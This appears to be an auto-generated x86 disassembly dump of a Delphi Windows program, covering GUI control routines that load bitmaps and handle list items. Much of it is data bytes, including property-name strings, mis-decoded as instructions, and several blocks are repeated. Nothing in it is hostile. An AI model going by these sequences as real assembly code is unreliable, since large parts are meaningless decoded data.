add eax 0x6f6c6f43
jb r-xdata
insb
sbb al 0x12
inc edx
add [ eax ] dh
add bh bh
add eax 0x5800044
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x18ff0000 ] 0x0
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
popad
jb r-xdata
adc al [ edx ]
xchg esp eax
add al [ eax ]
add bh bh
call 0x1465f3b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
add al 0x46
insb
popad
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
and al 0x0
pop es
dec ecx
insd
dec ebp
outsd
sub al 0xc3
inc ebx
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070025 ] al
insd
outsd
insb
outsd
jb r-xdata
add [ gs : eax ] dl
outsd
outsb
je r-xdata
push ss
inc edx
add [ eax ] ch
add bh bh
mov eax 0xc8004404
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040021 ] al
outsb
cwde
mov bl 0x43
add [ ebp ] bl
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
mov ah 0x43
popad
jb r-xdata
adc al [ edx ]
cwde
add al [ eax ]
jmp [ ebx + ebp + 0x46 ]
dec esi
popad
insd
add [ gs : eax ] dl
inc eax
add [ ecx ] bh
add al [ eax ]
add [ eax - 0x80000000 ] al
and eax 0x6d490700
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
dec eax
jne r-xdata
add [ eax ] al
add [ edx ] ch
add [ ebx ] cl
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x4182a474
add [ eax ] bl
add al [ eax ]
inc [ ebp + ecx * 4 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050028 ] al
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x40105474
add [ ecx + ecx * 4 - 0x7617ffbd ] ah
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0027 ] al
je r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61500e00
outsb
je r-xdata
add [ eax ] eax
insd
jae r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
add al 0x46
retn 0x43
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
push eax
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
call 0x38465ec8
add al [ eax ]
call [ ebx + ecx * 4 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor [ eax ] al
push es
push ebx
outsd
jb r-xdata
add al [ eax ]
push [ eax ]
mov eax [ ebx ]
add [ eax ] eax
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
push ebx
outsb
je r-xdata
add [ eax ] al
sub eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
test eax 0x54ff0001
insd
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
xor al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
jo r-xdata
jb r-xdata
push cs
push eax
popad
je r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
cmp al [ edx ]
add bh bh
xor [ ebx + 0x10043 ] cl
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jae r-xdata
jb r-xdata
xor [ eax ] eax
add eax 0x6c797453
push esp
mov ah 0x43
add [ eax + 0x446d ] al
outsb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add bh bh
push esp
mov eax [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
add bh bh
jl r-xdata
adc [ eax ] al
0x38ff0000 0x4405
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
bound ebp [ ebp + 0x4c ]
jns r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
outsb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call [ eax + 0x4dc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002f ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009002e ] al
inc esp
add [ ecx ] al
add [ eax ] al
cmp [ edx ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9451d05
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
sbb al 0x50
inc ebx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0038 ] al
outsb
inc esp
popad
je r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0700
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
xor eax [ eax ]
or [ ecx + 0x62 ] dl
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push edi
add [ eax ] al
jmp esp
adc [ eax ] al
cmp al 0x2
add bh bh
add [ edx + 0x10043 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003b ] al
outsb
inc esp
jb r-xdata
inc esi
imul ebp [ esi + 0x64 ] r-xdata
jo r-xdata
inc ecx
add [ eax ] ch
add [ eax ] eax
push eax
outsd
jo r-xdata
cmp [ eax ] eax
or al 0x4f
dec ebx
jns r-xdata
dec esp
outsb
inc ebp
outsb
inc esp
jb r-xdata
mov esp 0x180043b8
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jo r-xdata
add bh bh
[ eax ]
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc esp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x79 ] si
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
mov bh 0x43
add al bl
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
mov eax 0x7000434f
add al [ eax ]
push [ eax + 0x2 ]
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add bh bh
outsb
inc esp
popad
je r-xdata
dec edi
outsb
inc esp
popad
je r-xdata
dec edi
inc ebx
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060037 ] al
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
dec edi
jbe r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
insd
sub [ esi + 0xd00043 ] dh
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
jns r-xdata
jb r-xdata
dec edi
jb r-xdata
popad
dec ebp
outsd
jbe r-xdata
jae r-xdata
xor al 0x43
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
dec ebp
popad
jae r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ ebx ] cl
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
loopne r-xdata
jns r-xdata
jns r-xdata
dec esp
xor al 0x43
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
inc esp
jb r-xdata
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
dec edi
sub [ esi + 0xe00043 ] dh
add bh bh
loopne r-xdata
add [ eax ] eax
mov bh 0x43
jo r-xdata
jb r-xdata
outsd
js r-xdata
jb r-xdata
mov al [ 0xffffffffd80043b6 ]
add [ ebx ] cl
dec edi
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ edx ] cl
dec edi
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] al
ja r-xdata
mov [ fs : eax ] edx
add [ ecx - 0x235c0609 ] bl
stosd [ edi ]
inc edi
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ eax ] bl
push esp
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x44786f42
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
or [ eax ] 0x9
dec ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
add [ eax ] al
add al bl
add al ch
add al 0xb7
inc ebx
jns r-xdata
je r-xdata
popad
je r-xdata
push sub_462030
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
jb r-xdata
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
pop ds
inc esi
add [ eax + eax ] cl
push ebp
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
jb r-xdata
dec eax
add [ ecx ] cl
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
popad
lea eax [ bx + si ]
xchg esp eax
pop ds
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0xc0046 ] dl
add [ eax ] eax
outsb
inc ebp
outsb
je r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
insd
mov esp 0x80043b8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003e ] al
outsb
push ebx
je r-xdata
call sub_42818c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462029
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429274
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
add [ edx + esi ] bh
inc esp
outsd
sub_461c2d
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070035 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
cmp [ eax ] eax
or al 0x4f
js r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc esp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x79 ] si
inc ecx
add [ eax ] ch
add [ eax ] eax
push eax
outsd
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003f ] al
dec edi
jbe r-xdata
[ eax ]
jo r-xdata
dec ebx
jns r-xdata
dec esp
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
outsb
inc esp
popad
je r-xdata
dec edi
dec edi
inc ebx
add [ eax + 0x2 ] ah
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060037 ] al
outsb
inc esp
popad
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
mov bh 0x43
add al bl
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
dec esp
xor al 0x43
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003d ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
cmp [ edx ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9451d05
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
sbb al 0x50
inc ebx
add [ eax + 0x2 ] ch
add bh bh
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0038 ] al
outsb
inc esp
popad
je r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
insd
sub [ esi + 0xd00043 ] dh
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
jns r-xdata
jb r-xdata
add [ eax + 0x4f070040 ] al
add [ eax ] al
ja r-xdata
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003b ] al
outsb
inc esp
jb r-xdata
inc esi
imul ebp [ esi + 0x64 ] r-xdata
jo r-xdata
popad
dec ebp
outsd
jbe r-xdata
jae r-xdata
xor al 0x43
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0045 ] al
outsb
dec ebp
popad
jae r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ ebx ] cl
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
jb r-xdata
loopne r-xdata
jns r-xdata
popad
je r-xdata
mov esp 0x180043b8
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jo r-xdata
add bh bh
add eax [ eax ]
add [ eax ] al
push edi
jb r-xdata
dec edi
sub [ esi + 0xe00043 ] dh
add bh bh
loopne r-xdata
add [ eax ] eax
mov bh 0x43
jo r-xdata
jb r-xdata
outsd
js r-xdata
jb r-xdata
mov al [ 0xffffffffd80043b6 ]
add [ ebx ] cl
dec edi
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0043 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ edx ] cl
dec edi
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060041 ] al
outsb
inc ebp
js r-xdata
outsb
inc ebp
outsb
je r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1180043
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
insd
mov esp 0x80043b8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003e ] al
outsb
mov eax 0x7000434f
add al [ eax ]
push [ eax + 0x2 ]
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add bh bh
mov [ fs : eax ] edx
add [ ecx - 0x235c0609 ] bl
stosd [ edi ]
inc edi
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ eax ] bl
push esp
inc ebx
push 0x4c6b6365
imul esi [ ebx + 0x74 ] 0x44786f42
inc eax
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
or [ eax ] 0x9
dec ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
add [ eax ] al
add al bl
add al ch
add al 0xb7
inc ebx
jns r-xdata
je r-xdata
push sub_462030
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
jb r-xdata
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
pop ds
inc esi
add [ eax + eax ] cl
push ebp
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
jb r-xdata
dec eax
add [ ecx ] cl
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
popad
lea eax [ bx + si ]
xchg esp eax
pop ds
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0xc0046 ] dl
add [ eax ] eax
outsb
push ebx
je r-xdata
call sub_42818c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462029
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429274
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
add [ edx + esi ] bh
inc esp
outsd
sub_461fb0
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_462029
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429274
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462030
mov eax [ ebp - 0x4 ]
call sub_40324c
retn
add eax 0x3
sub_462058
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4383d8
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4620a8
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x290 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4384c4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_4620d8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax ebx
call sub_438f90
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax ebx
call sub_4621f8
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebx + 0x290 ]
call sub_40d420
inc eax
mov [ esp ] eax
xor esi esi
mov edx esi
mov eax ebx
call sub_46297c
mov edi eax
mov edx esi
mov eax [ ebx + 0x290 ]
call sub_41a238
mov ebp eax
mov eax ebp
call sub_462048
mov [ edi + 0x8 ] al
mov eax ebp
call sub_46204c
mov [ edi + 0x9 ] al
inc esi
dec [ esp ]
jne r-xdata
sub_46214c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_439060
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x290 ] eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov edx esi
mov eax ebx
call sub_462768
xor al 0x1
push eax
mov edx esi
mov eax ebx
call sub_462794
pop edx
call sub_462034
mov edx eax
mov eax [ ebx + 0x290 ]
call sub_41a0dc
inc esi
dec edi
jne r-xdata
sub_4621f8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_446ee8
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x228 ]
call sub_423d88
mov edx r-xdata
mov eax [ ebx + 0x228 ]
call sub_423ce4
mov esi eax
mov [ ebx + 0x284 ] esi
push esi
xor ecx ecx
mov edx 0x1a0
mov eax ebx
call sub_441578
sub_46224b
inc [ edx ]
add [ eax ] al
add [ edi + 0x67 ] dl
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4621d8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
push edi
lea esi [ ebp - 0x24 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_439418
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x252 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_462768
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x254 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x250 ] edx
mov [ eax + 0x254 ] edx
xor eax eax
push ebp
push sub_4623da
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_439418
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x254 ] edx
retn
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_462b3c
test al al
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x294 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
